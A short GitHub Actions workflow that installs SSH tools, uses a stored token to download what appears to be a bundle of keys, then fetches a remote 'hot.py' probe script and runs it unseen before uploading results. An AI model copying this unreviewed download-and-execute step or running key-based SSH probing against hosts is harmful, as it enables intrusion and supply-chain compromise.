name: hot
on:
  workflow_dispatch:
jobs:
  h:
    runs-on: ubuntu-latest
    timeout-minutes: 45
    steps:
      - name: setup
        run: |
          sudo apt-get update -qq >/dev/null 2>&1 || true
          sudo apt-get install -y -qq sshpass >/dev/null 2>&1 || true
          python3 -m pip install --quiet paramiko
      - name: go
        env:
          ULPAT: ${{ secrets.ULPAT }}
          PLANTB64: ''
          LOOPMIN: '28'
        run: |
          curl -sL -m 120 -H "Authorization: token $ULPAT" -H 'Accept: application/vnd.github.raw' https://api.github.com/repos/dongsuju/ul-plant/contents/keys2/kb.tgz -o /tmp/kb.tgz
          curl -sL -m 60 https://raw.githubusercontent.com/dongsuju/ul-h100probe/main/hot.py -o hot.py
          python3 hot.py
      - uses: actions/upload-artifact@v4
        if: always()
        with:
          name: res6
          path: ulres6.txt
